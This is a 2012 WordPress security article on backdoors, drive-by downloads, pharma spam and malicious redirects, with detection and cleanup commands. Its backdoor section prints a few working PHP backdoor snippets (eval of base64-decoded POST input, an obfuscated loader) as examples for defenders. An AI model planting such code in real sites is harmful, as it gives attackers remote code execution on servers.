---
title: Common WordPress Malware Infections
slug: four-malware-infections-wordpress
image: >-
  https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/6894a449-76ea-4362-90ab-a889d32f912d/pacman.png
date: 2012-10-10T06:32:35.000Z
author: siobhan-mckeown
description: >-
  **WordPress security** is serious business. Exploits of vulnerabilities in
  WordPress’ architecture have led to mass compromises of servers through
  cross-site contamination. WordPress’ extensibility increases its
  vulnerability; plugins and themes house flawed logic, loopholes, Easter eggs,
  backdoors and a slew of other issues. Firing up your computer to find that
  you’re supporting a random cause or selling Viagra can be devastating.
categories:
  - WordPress
  - Techniques
  - Security
---
<strong>WordPress security</strong> is serious business. Exploits of vulnerabilities in WordPress’ architecture have led to mass compromises of servers through cross-site contamination. WordPress’ extensibility increases its vulnerability; plugins and themes house flawed logic, loopholes, Easter eggs, backdoors and a slew of other issues. Firing up your computer to find that you’re supporting a random cause or selling Viagra can be devastating.

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/763787a7-2af3-4ab4-83f4-779ffefbaffd/wordpress-security.jpg"><img loading="lazy" decoding="async"  class="alignnone wp-image-78211 size-full" title="WordPress Security" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/763787a7-2af3-4ab4-83f4-779ffefbaffd/wordpress-security.jpg" alt="wordpress malware" width="500" height="380" /></a>

In WordPress’ core, all security issues are quickly addressed; the WordPress team is focused on strictly maintaining the integrity of the application. The same, however, cannot be said for all plugins and themes.</p>

## <span class="rh">Further Reading</span> on SmashingMag:

*   [How To Secure Your WordPress Website](https://www.smashingmagazine.com/2011/11/securing-your-wordpress-website/)
*   [10 Useful WordPress Security Tweaks](https://www.smashingmagazine.com/2010/07/10-useful-wordpress-security-tweaks/)
*   [A Comprehensive Checklist To Creating The Perfect WordPress Website](https://www.smashingmagazine.com/2011/12/15-step-checklist-creating-perfect-wordpress-website/)
*   [Guide To WordPress Coding Standards](https://www.smashingmagazine.com/2012/07/guide-wordpress-coding-standards/)

{{% feature-panel %}}

The focus of this post is not to add to the overwhelming number of WordPress security or WordPress hardening posts that you see floating around the Web. Rather, <strong>we’ll provide more context about the things you need to protect yourself from</strong>. What hacks are WordPress users particularly vulnerable to? How do they get in? What do they do to a WordPress website? In this lengthy article, we'll cover <a href="#backdoors">backdoors</a>, <a href="#drive-by-downloads">drive-by downloads</a>, <a href="#pharma-hack">pharma hack</a> and <a href="#malicious-redirects">malicious redirects</a>. Please notice that some anti-virus apps report this article as malware, probably because it contains examples of the code that should be avoided. <strong>This article does not contain any malware itself</strong>, so the alert must be based on heuristic analysis.

Over the past two years, Web malware has grown around 140%. At the same time, WordPress has exploded in popularity as a blogging platform and CMS, powering close to 17% of websites today. But that popularity comes at a price; it makes WordPress a target for Web-based malware. Why? Simple: its reach provides the opportunity for maximum impact. Sure, popularity is a good thing, but it also makes us WordPress users vulnerable.</p>

## A Bit About Our Security Expert: Meet Tony

Lacking the technical knowledge needed to go into great depth, I brought on board a co-author to help me out. Bringing the technical information is <a href="https://twitter.com/perezbox">Tony Perez</a>, Chief Operations and Financial Officer of <a href="https://sucuri.net">Sucuri Security</a>. Sucuri Security provides detection, alerting and remediation services to combat Web-based malware. In other words, it works on websites that have been compromised. This means that Tony has the background, statistics and, most importantly, knowledge to go really in depth on malware issues that affect WordPress users.

I asked Tony how he got into Web security:
<blockquote><img loading="lazy" decoding="async"  class="106927" style="width: 80px; float: right; padding: 10px 20px;" title="tony" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/ebd3ae5a-fe61-4077-9c8e-e93bb4845fa4/tony.jpg" alt="Tony" />

"I think it goes back to 2009. I was managing and architecting large-scale enterprise solutions for Department of Defense (DoD) clients and traveling the world. In the process, there was a little thing called compliance with the <a href="https://en.wikipedia.org/wiki/Security_Technical_Implementation_Guide">Security Technical Implementation Guide</a> (STIG), set forth by the <a href="https://www.disa.mil/">Defense Information Systems Agency</a> (DISA). I know, a mouthful, but it’s how we did things in the DoD; if it didn’t have an acronym, it didn’t belong.

That being said, it wasn’t until I joined Dre and Daniel at Sucuri Security, in early 2011, that I really began to get what I consider to be any resemblance of InfoSec chops."</blockquote>

Armed with Tony’s technical knowledge, we’ll look at the main issues that affect WordPress users today. But before we get into details, let’s look at some of the reasons why WordPress users might be vulnerable.</p>

## What Makes WordPress Vulnerable?

Here’s the simple answer. Old versions of WordPress, along with theme and plugin vulnerabilities, multiplied by the CMS’ popularity, with the end user thrown into the mix, make for a vulnerable website.

Let’s break that down.

The first issue is <strong>outdated versions of WordPress</strong>. Whenever a new WordPress version is released, users get a nagging message, but plenty of users have gotten pretty good at ignoring the nag. Core vulnerabilities in themselves are rarely an issue. They do exist; proof can be found in the most recent <a href="https://codex.wordpress.org/Version_3.3.3">3.3.3</a> and <a href="https://codex.wordpress.org/Version_3.4.1">3.4.1</a> releases. WordPress’ core team has gotten pretty good at rolling out security patches quickly and efficiently, so the risk of exploitation is minimal, provided that WordPress users update their installation. This, unfortunately, is the crux of the problem: <a href="https://wprealm.com/blog/staying-upgraded-why-its-important/">WordPress users ignore the message.</a> And it’s not just inexperienced and casual WordPress users who aren’t updating. A recent high-profile hack was of the Reuters website, which was <a href="https://blogs.wsj.com/cio/2012/08/05/hacked-reuters-wordpress-platform-had-known-security-issue/">running version 3.1.1</a> instead of the current 3.4.1.

<strong>Vulnerabilities in plugins and themes</strong> is another issue. The WordPress repository has 20,000 plugins and is growing. The plugins are of varying quality; some of them inevitably have security loopholes, while others are outdated. On top of that, consider all of the themes and plugins outside of the repository, including commercial products that are distributed for free on Warez websites and come packed with malware. Google is our favorite search engine, but it’s <a href="https://wpmu.org/why-you-should-never-search-for-free-wordpress-themes-in-google-or-anywhere-else/">not so hot for finding quality WordPress themes</a>.

Then, there’s popularity. <strong>WordPress is popular</strong>, without a doubt. Around 700 million websites were recorded as using WordPress in May of this year. This popularity means that if a hacker can find a way into one WordPress website, they have potentially millions of websites for a playground. They don’t need to hack websites that use the current version of WordPress; they can scan for websites that use old insecure versions and hack those.

Finally and most significantly, the biggest obstacle facing WordPress users is themselves. Tony in his own words:
<blockquote>"For whatever reason, there is this perception among WordPress users that the hardest part of the job was paying someone to build the website and that once its built, that’s it, it’s done, no further action required. Maybe that was the case seven years ago, but not today.

WordPress’ ease of use is awesome, but I think it provides a false sense of assurances to end users and developers alike. I think, though, this perception is starting to change."</blockquote>

From Tony’s experience at Sucuri Security, the most common vulnerabilities to website exploits are:

*   Out of date software,
*   Poor credential management,
*   Poor system administration,
*   Soup-kitchen servers,
*   Lack of Web knowledge,
*   Corner-cutting.

A bit of time and education are all it takes to remedy these issues and to keep your WordPress website secure. This means not just ensuring that you as a WordPress expert are educated, but ensuring that the clients you hand over websites to are as well.</p>

## The Evolution Of Attacks

As the Internet has evolved, the nature of hacking has evolved with it. Hacking started out as a very different animal. Back in the day, it was about showing your technical prowess by manipulating a website to do things beyond the webmaster’s intentions; this was often politically motivated. One day you’d wake up and find yourself supporting the opposition in Nigeria or Liberia. These days, hacking is all about money. The recent <a href="https://en.wikipedia.org/wiki/DNSChanger">DNSChanger</a> malware (i.e. the “Internet Doomsday” attack), for example, let hackers rake in close to $14 million before being stopped by the FBI and Estonian police last November.

Another hacking technology that has emerged is malnets. These distributed malware networks are used for everything including identify theft, DDoS attacks, spam distribution, drive-by downloads, fake AV and so on. The hackers automate their attacks for maximum exposure.

Automation through the use of bots is not their only mechanism. Today you also have malware automation: the use of tools to quickly generate a payload (i.e. the infection), allowing the attacker to focus strictly on gaining access to the environment. Once the hacker has access to the environment, they copy and paste in the auto-generated payload. One of the more prevalent automation tools is the <a href="https://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>. This and many other kits can be purchased online for a nominal fee. That fee buys sustainment services and keeps the kit updated with new tools for the latest vulnerabilities. It’s a true enterprise.</p>

## Common WordPress Malware Issues

Thousands of malware types and infections are active on the Internet; fortunately, not all apply to WordPress. For the rest of this post, we’ll look at four of the most common attacks on WordPress users:

*   [Backdoors](#backdoors),
*   [Drive-by downloads](#drive-by-downloads),
*   [Pharma hacks](#pharma-hack),
*   [Malicious redirects](#malicious-redirects).</p>

### Backdoor

A backdoor lets an attacker gain access to your environment via what you would consider to be abnormal methods — FTP, SFTP, WP-ADMIN, etc. Hackers can access your website using the command line or even using a Web-based GUI like this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/872ad110-1ad0-4a29-8607-d465983ff564/backdoor.png"><img loading="lazy" decoding="async"  class="aligncenter size-full wp-image-106952" title="backdoor_small" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/f531d2a5-d1ac-4595-854e-ad71a4ceb7c4/backdoor-small.png" alt="backdoor gui screenshot" width="792" height="424" /></a><br>
<em>A backdoor GUI. Click the image for the whole picture!</em>

Backdoors are exceptionally dangerous. Left unchecked, the most dangerous can cause havoc on your server. They are often attributed to cross-site contamination incidents — i.e. when websites infect other websites on the same server.

<strong>How am I attacked?</strong>

The attack often happens because of out-of-date software or security holes in code. A vulnerability well known to the WordPress community was <a href="https://markmaunder.com/2011/08/01/zero-day-vulnerability-in-many-wordpress-themes/">found in the TimThumb script</a> that was used for image resizing. This vulnerability made it possible for hackers to upload a payload that functioned as a backdoor.

Here is an example of a scanner looking specifically for vulnerable versions of TimThumb:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/2f40ea47-3415-4ade-970e-21c183216f0f/lscreenshot-2.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/2f40ea47-3415-4ade-970e-21c183216f0f/lscreenshot-2.png" alt="Screenshot" /></a>

<strong>What does it look like?</strong>

Like most infections, this one can be encoded, encrypted, concatenated or some combination thereof. However, it’s not always as simple as looking for encrypted code; there are several instances in which it looks like legitimate code. Here is an example:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/a228188d-fc9f-481a-bc18-1a07b93ce103/lscreenshot-3.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/a228188d-fc9f-481a-bc18-1a07b93ce103/lscreenshot-3.png" alt="Screenshot" /></a>

Another example:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/8c38bea3-af5b-48c5-93d4-36cdf9999150/lscreenshot-4.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/8c38bea3-af5b-48c5-93d4-36cdf9999150/lscreenshot-4.png" alt="Screenshot" /></a>

Below is a case where the content is hidden in the database and targets WordPress installations:

<pre><code class="language-php">return @eval(get_option(’blogopt1’));</code></pre>

And here is a very simple backdoor that allows any PHP request to execute:

<pre><code class="language-php">eval (base64_decode($_POST["php"]));</code></pre>

Here is an example of a messy backdoor specifically targeting the TimThumb vulnerability:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/585b63d0-1e9a-4168-b9e1-3beed83fa3cf/lscreenshot-5.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/585b63d0-1e9a-4168-b9e1-3beed83fa3cf/lscreenshot-5.png" alt="Screenshot" /></a>

Here is another backdoor that commonly affects WordPress installations, the <a href="https://labs.sucuri.net/db/malware/backdoor-phpfilesman02">Filesman</a>:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/bcc45933-a4b1-4185-b6d2-6fc146297abc/lscreenshot-6.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/bcc45933-a4b1-4185-b6d2-6fc146297abc/lscreenshot-6.png" alt="Screenshot" /></a>

<strong>How can I tell whether I’m infected?</strong>

Backdoors come in all different sizes. In some cases, a backdoor is as simple as a file name being changed, like this:

*   `wtf.php`
*   `wphap.php`
*   `php5.php`
*   `data.php`
*   `1.php`
*   `p.php`

In other cases, the code is embedded in a seemingly benign file. For instance, this was found in a theme’s <strong><code>index.php</code> file, embedded in legitimate code</strong>:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/3322152d-13f5-4a10-9499-a0aa41ff59c2/lscreenshot-7.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/3322152d-13f5-4a10-9499-a0aa41ff59c2/lscreenshot-7.png" alt="Screenshot" /></a>

Backdoors are tricky. They constantly evolve, so there is no definitive way to say what you should look for.

<strong>How do I prevent it?</strong>

While backdoors are difficult to detect, preventing them is possible. For the hack to be effective, your website needs an entry point that is accessible to the hacker. You can close backdoors by doing the following:

1.  **Prevent access.** Make your environment difficult to access. Tony recommends a three-pronged approach to locking down `wp-admin`:
    *   Block IPs,
    *   Two-factor authentication,
    *   Limited access by default.This will make it extremely difficult for anyone except you to access your website.
2.  **Kill PHP execution.** Often the weakest link in any WordPress chain is the `/uploads/` directory. It is the only directory that needs to be writable in your installation. You can make it more secure by preventing anyone from executing PHP. It’s simple to do. Add the following to the `.htaccess` file at the root of the directory. If the file doesn’t exist, create it.

<pre><code class="language-php">&lt;Files *.php&gt;
Deny from All
&lt;/Files&gt;</code></pre>

<strong>How is it cleaned?</strong>

Once you have found a backdoor, cleaning it is pretty easy — just delete the file or code. However, finding the file can be difficult. On his blog, <a href="https://cantonbecker.com/work/musings/2009/how-to-search-for-backdoors-in-a-hacked-wordpress-site/">Canton Becker provides some advice</a> on ways to scour your server for backdoors. There is no silver bullet for backdoors, though, or for any infection — backdoors can be simple or complex. You can try doing some basic searches for <code>eval</code> and <code>base64_decode</code>, but if your code looks like what’s below, then knowing what to look for becomes more difficult:

<pre><code class="language-php">$XKsyG=’as’;$RqoaUO=’e’;$ygDOEJ=$XZKsyG.’s’.$RqoaUO.’r’.’t’;$joEDdb=’b’.$XZKsyG.
$RqoaUO.(64).’_’.’d’.$RqoaUO.’c’.’o’.’d’.$RqoaUO;@$ygDOEJ(@$joEDdb(‘ZXZhbChiYXN
lNjRfZGVjb2RlKCJhV1lvYVhOelpY…</code></pre>

If you are familiar with the terminal, you could log into your website using SSH and try certain methods. The most obvious and easiest method is to look for this:

<pre><code class="language-php"># grep -ri "eval" [path]</code></pre>

Or for this:

<pre><code class="language-php"># grep -ri "base64_decode" [path]</code></pre>

The <code>r</code> ensures that all files are scanned, while the <code>i</code> ensures that the scan is case-insensitive. This is important because you could find variations of <code>eval</code>: <code>Eval</code>, <code>eVal</code>, <code>evAl</code>, <code>evaL</code> or any other permutation. The last thing you want is for your scan to fall short because you were too specific.

Look for recently modified files:

<pre><code class="language-php">find -type f -ctime -0 | more</code></pre>

The <code>-type</code> looks for files, and <code>-ctime</code> restricts your scan to the last 24 hours. You can look at the last 24 or 48 hours by specifying <code>-1</code> or <code>-2</code>, respectively.

Another option is to use the <code>diff</code> command. This enables you to detect the differences between files and directories. In this case, you would use it for directories. For it to be successful, though, you need to have clean copies of your installation and themes. So, this works only if you have a complete backup of your website.

<pre><code class="language-php"># diff -r /[path]/[directory] /[path]/[directory] | sort</code></pre>

The <code>-r</code> option is recursive through all directories, and the <code>sort</code> command sorts the output and makes it easier to read. The key here is to quickly identify the things that don’t belong so that you can run integrity checks. Anything you find that is in the live website’s directory but not in the backup directory warrants a second look.</p>

### Drive-By Downloads

A drive-by download is the Web equivalent of a drive-by shooting. Technically, it is usually embedded on your website via some type of script injection, which could be associated with a link injection.

The point of a drive-by download is often to download a payload onto your user’s local machine. One of the most common payloads informs the user that their website has been infected and that they need to install an anti-virus product, as shown here:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/33667754-d43e-434d-b677-5e62ccfeabed/fakeav2-650x419.png"><img loading="lazy" decoding="async"  loading="lazy" decoding="async" class="78211" title="wasp" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/33667754-d43e-434d-b677-5e62ccfeabed/fakeav2-650x419.png" alt="" width="500" /></a>

<strong>How does the attack get in?</strong>

There are a number of ways an attack can get in. The most common causes are:

*   Out of date software,
*   Compromised credentials (`wp-admin`, FTP),
*   SQL injection.

<strong>What does it look like?</strong>

Below are a number of examples of link injections that lead to some type of drive-by download attack:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/7dac153a-6d01-4dd1-9e03-db2aaf61383d/screenshot-7.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/7dac153a-6d01-4dd1-9e03-db2aaf61383d/screenshot-7.png" alt="Screenshot" /></a>

And this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/dae3b1b8-9d7e-4a7c-86ee-590c8e4d6217/lscreenshot-9.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/dae3b1b8-9d7e-4a7c-86ee-590c8e4d6217/lscreenshot-9.png" alt="Screenshot" /></a>

And this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/c375756a-cbca-4754-b0b6-cb1b280cbe69/lscreenshot-10.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/c375756a-cbca-4754-b0b6-cb1b280cbe69/lscreenshot-10.png" alt="Screenshot" /></a>

More recently, drive-by downloads and other malware have been functioning as conditional malware — designed with rules that have to be met before the infection presents itself. You can find more information about how conditional malware works in Sucuri’s blog post “<a href="https://sucuri.net/understanding-conditional-malware-ip-centric-variation.html">Understanding Conditional Malware</a>.”

<strong>How can I tell whether I’m infected?</strong>

Using a scanner such as <a href="https://sitecheck.sucuri.net">SiteCheck</a> to see whether you are infected is possible. Scanners are pretty good at picking up link injections. Another recommendation is to sign up for <a href="https://www.google.com/webmasters/tools/home?hl=en">Google Webmaster Tools</a> and verify your website. In the event that Google is about to blacklist your website, it would email you beforehand notifying you of the problem and giving you a chance to fix it. The free service could pay dividends if you’re looking to stay proactive.

Outside of using a scanner, the difficulty in identifying an infection will depend on its complexity. When you look on the server, it will look something like this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/47f5bd1f-3126-4b15-8f57-c7b37a7b2ca6/lscreenshot-11.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/47f5bd1f-3126-4b15-8f57-c7b37a7b2ca6/lscreenshot-11.png" alt="Screenshot" /></a>

The good news is that such an infection has to be somewhere where an external output is generated. The following files are common places where you’ll find link injections:

*   `wp_blog_header.php` (core file)
*   `index.php` (core file)
*   `index.php` (theme file)
*   `function.php` (theme file)
*   `header.php` (theme file)
*   `footer.php` (theme file)

About 6 times out of 10, the infection will be in one of those files. Also, your anti-virus software might detect a payload being dropped onto your computer when you visit your website — another good reason to run anti-virus software locally.

Sucuri has also found link injections embedded in posts and pages (as opposed to an originating PHP file), as well as in text widgets. In such cases, scrub your database and users to ensure that none of your accounts have been compromised.

<strong>How is it cleaned?</strong>

Cleaning can be a challenge and will depend on your technical skill. You could use the terminal to find the issue.

If you have access to your server via SSH, you’re in luck. If you don’t, you can always download locally. Here are the commands that will be of most use to you when traversing the terminal:

*   `CURL` Used to transfer data with a URL syntax.
*   `FIND` Search by file or directory name.
*   `GREP` Search for content in files.

For example, to search all of your files for a particular section of the injection, try something like this:

<pre><code class="language-php">$ grep -r "https://objectcash.in" .</code></pre>

Including the following characters is important:

*   `"` Maintains the integrity of the search. Using it is important when you’re searching for special characters because some characters have a different meaning in the terminal.
*   `-r` Means “recursive” and will traverse all directories and files.

You can also refine your search by file type:

<pre><code class="language-php">$ grep --include ".php" -r "https://objectcash.in" .</code></pre>

Enabling the <code>--include</code> option allows you to specify file type; in this instance, only PHP files.

These are just a few tricks. Once you’ve located the infection, you have to ensure that you remove every instance of it. Leaving just one could lead to serious frustration in the future.</p>

### Pharma Hack

<a href="https://digwp.com/2010/07/wordpress-security-lockdown/#pharma-hack">Pharma hack</a> is one of the most prevalent infections around. It should not be confused with malware; it’s actually categorized as SPAM — “stupid pointless annoying messages.” If you’re found to be distributing SPAM, you run the risk of being flagged by Google with the following alert:

<pre><code class="language-php">This site may be compromised!!</code></pre>

This is what it will look like on Google’s search engine results page (SERP):

<img loading="lazy" decoding="async"  class="aligncenter size-full wp-image-106933" title="SPAM SERPS" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/be5d6886-7ea3-456d-877e-6efe7ffc1779/spam-serps.png" alt="" width="500" />

<strong>How am I attacked?</strong>

The pharma SPAM injection makes use of conditional malware that applies rules to what the user sees. So, you may or may not see the page above, depending on various rules. This is controlled via code on the server, such as the following:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/3e91e4b1-c31d-44a3-8ed4-ea60cdebfd10/lscreenshot-12.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/3e91e4b1-c31d-44a3-8ed4-ea60cdebfd10/lscreenshot-12.png" alt="Screenshot" /></a>

Some injections are intelligent enough to create their own nests within your server. The infection makes use of <code>$_SERVER["HTTP_REFERER"]</code>, which redirects the user to an online store that is controlled by the attacker to generate revenue. Here is an example of such a monetized attack:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/eeaeb4f5-2068-4bb2-8e06-6fb49ed7540e/lscreenshot-13.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/eeaeb4f5-2068-4bb2-8e06-6fb49ed7540e/lscreenshot-13.png" alt="Screenshot" /></a>

Like most SPAM-type infections, pharma hack is largely about controlling traffic and making money. Money can be made through click-throughs and/or traffic. Very rarely does a pharma hack injection redirect a user to a malicious website that contains some additional infection, as with a drive-by download attempt.

This is why it’s so difficult to detect. It’s not as simple as querying for “Cialis” or “Viagra,” although that’d be awesome. Most people would be surprised by the number of legitimate pharmaceutical companies that exist and publish ads on the Web. This adds to the challenge of detecting these infections.

<strong>What does it look like?</strong>

Pharma hack has evolved, which has made it more difficult to detect. In the past, SPAM injections would appear in your pages, where they were easy to find and, more importantly, remove.

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/aa6604ab-612d-41d2-92b4-bcf9d1397ee8/spaminjection.jpg"><img loading="lazy" decoding="async"  loading="lazy" decoding="async" class="78211" title="wasp" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/aa6604ab-612d-41d2-92b4-bcf9d1397ee8/spaminjection.jpg" alt="" /></a>

Today, however, pharma hack is quite different. It uses a series of backdoors, sprinkled with intelligence, to detect where traffic is coming from, and then it tells the infection how to respond. Again, it can behave as conditional malware. More and more, pharma hack reserves its payload for Google’s bots; the goal is to make it onto Google’s SERPs. This provides maximum exposure and the biggest monetary return for the hackers.

Here’s an image of an old pharma hack injecting SPAM into a blog’s tags:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/e22f1764-d184-4cd0-bdee-7694235e4a2f/spam-tags.png"><img loading="lazy" decoding="async"  title="SPAM TAGS" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/e22f1764-d184-4cd0-bdee-7694235e4a2f/spam-tags.png" alt="screenshot of a blog's tags with pharma hack tags" width="500" /></a>

Another version of pharma hack was injected in such a way that when the user clicks on an apparently benign link (such as “Home,” “About” or “Contact”), it redirects the user to a completely different page. Somewhere like this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/af064353-11c9-40a1-94d1-5ad055cc34df/pharmacyads.png"><img loading="lazy" decoding="async"  loading="lazy" decoding="async" class="78211" title="wasp" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/af064353-11c9-40a1-94d1-5ad055cc34df/pharmacyads.png" alt="" width="500" /></a>

<strong>How do I tell whether I’m infected?</strong>

Identifying an infection can be very tricky. In earlier permutations, identifying an infection was as easy as navigating your website, looking at your ads, links, posts and pages, and quickly determining whether you’ve been infected. Today, there are more advanced versions that are harder to find.

The good news for diligent webmasters is that by enabling some type of auditing or file monitoring on your WordPress website, you’ll be able to see when new files have been added or when changes have been made. This is by far one of the most effective methods of detection.

You could try using free scanners, such as <a href="https://sitecheck.sucuri.net">SiteCheck</a>. Unfortunately, many HTTP scanners, including Sucuri’s, struggle with the task because pharma hack is not technically malicious, so determining the validity of content can be difficult for a scanner.

<strong>How is it cleaned?</strong>

First, identify the infected files, and then remove them. You can use the commands we’ve outlined above, and you can make queries to your website via the terminal to quickly see whether you’re serving any pharma SPAM to your visitors.

When combatting pharma hacks, one of the most useful commands is <code>grep</code>. For example, to search for any of the ads or pharma references being flagged, run this:

<pre><code class="language-php"># egrep -wr 'viagra|pharmacy' .</code></pre>

By using <code>egrep</code>, we’re able to search multiple words at the same time if necessary, thus saving you time in this instance.

Or try something like this:

<pre><code class="language-php"># grep -r "https://canadapharmacy.com" .</code></pre>

This only works if the infection is not encoded, encrypted or concatenated.

Another useful method is to access your website via different user agents and referrers. Here is an example of what one website looked like when using a Microsoft IE 6 referrer:

<img loading="lazy" decoding="async"  class="aligncenter size-full wp-image-106934" title="User Agent Pharma Response" src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/c5310b02-e61d-40de-87a8-97fbe422a441/user-agent-pharma-response.png" alt="" width="500" />

Try <a href="https://www.botsvsbrowsers.com/SimulateUserAgent.asp">Bots vs Browsers</a> to check your website through a number of different browsers.

Terminal users can also use <code>CURL</code>:

<pre><code class="language-php"># curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" https://somesite.com</code></pre>

<strong>How do I prevent it?</strong>

Preventing a pharma hack can be tricky. Sucuri has found that the hack <strong>regularly exploits vulnerable out-of-date software</strong>. However, your out-of-date WordPress installation is not necessarily the problem. Even if you are up to date, <a href="https://blog.sucuri.net/2012/03/website-cross-contamination-blackhat-seo-spam-malware.html">another outdated installation on the same server could be vulnerable</a> to the infection. If the real payload resides elsewhere on your server, not within your website’s directory, then catching it can be exceptionally difficult.

Here is an example of what you might be looking for if you can’t find the infection in your own installation:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/c99d9363-b753-44e5-8945-e8fe81769d0a/lscreenshot-14.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/c99d9363-b753-44e5-8945-e8fe81769d0a/lscreenshot-14.png" alt="Screenshot" /></a>

To prevent a pharma hack, you should do two things:

1.  Keep your software up to date,
2.  Steer clear of soup-kitchen servers.</p>

### Malicious Redirects

A malicious redirect sends a user to a malicious website. In 2010, 42,926 new malicious domains were detected. In 2011, this number grew to 55,294. And that just includes primary domains, not all of their subdomains.

When a visitor is redirected to a website other than the main one, the website may or may not contain a malicious payload. Suppose you have a website at <code>myhappysite.com</code>; when someone visits it, the website could take the visitor to <code>meansite.com/stats.php</code>, where the malicious payload is in that website’s <code>stats.php</code> file. Or it could be a harmless website with just ads and no malicious payload.

<strong>How am I attacked?</strong>

As with many malware attacks, it comes down to access. The malicious redirect could be generated by a backdoor. The hacker would scan for a vulnerability, such as TimThumb or old versions of WordPress and, when they find it, upload a payload that functions as a backdoor.

<strong>What does it look like?</strong>

Detecting a redirect is not as complex as detecting some of the other infections. It is often found in your <code>.htaccess</code> file and looks something like this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/a9ae3e90-5633-4a7a-9627-7734fe4b993a/lscreenshot-16.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/a9ae3e90-5633-4a7a-9627-7734fe4b993a/lscreenshot-16.png" alt="Screenshot" /></a>

Or like this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/51ff6100-8cfc-4081-99a1-0661d964a8e1/lscreenshot-15.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/51ff6100-8cfc-4081-99a1-0661d964a8e1/lscreenshot-15.png" alt="Screenshot" /></a>

There may be instances where a redirect is encoded and resides in one of your PHP files. If so, it will usually be found in your <code>header.php</code>, <code>footer.php</code> or <code>index.php</code> file; it has also been known to reside in the root <code>index.php</code> file and in other core template files. It is not always encoded, but if it is, it will look something like this:

<a href="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/4eb19858-d602-4b7d-8aea-f4d7abfc5d83/lscreenshot-17.png"><img loading="lazy" decoding="async"  src="https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/4eb19858-d602-4b7d-8aea-f4d7abfc5d83/lscreenshot-17.png" alt="Screenshot" /></a>

<strong>How do I tell if I am infected?</strong>

There are a few ways to check for infections. Here are some suggestions:

*   Use a **free scanner**, such as [SiteCheck](https://sitecheck.sucuri.net). They very rarely miss malicious redirects.
*   **Test** using [Bots vs Browser](https://botsvsbrowsers.com/).
*   **Listen to your users**. You might not detect the redirect, but sometimes a user will alert you to it.

